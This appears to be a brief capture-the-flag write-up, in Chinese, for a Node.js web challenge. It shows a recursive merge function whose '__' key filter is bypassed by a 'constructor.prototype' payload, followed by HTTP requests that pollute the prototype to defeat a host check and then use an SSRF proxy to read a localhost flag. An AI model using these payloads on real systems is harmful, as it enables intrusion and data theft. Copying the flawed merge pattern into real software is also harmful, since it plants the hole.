```javascript
function update(dst, src) {
  for (key in src) {
    if (key.indexOf("__") != -1) {
      continue;
    }
    if (typeof src[key] == "object" && dst[key] !== undefined) {
      update(dst[key], src[key]);
      continue;
    }
    dst[key] = src[key];
  }
}

```
update函数存在原型链污染，可以污染{}让strategy多出现一些属性，从而绕过host限制

```
POST /user/info HTTP/1.1
Content-Type: application/json
Host: 106.14.57.14:32385
Cookie: xxxxxxx

{"constructor":{"prototype":{"127.0.0.1":true}}}
```

ssrf 获取flag

```
GET /proxy?url=http://127.0.0.1:3000/flag HTTP/1.1
Host: 106.14.57.14:32385
Cookie: xxxxxxx
```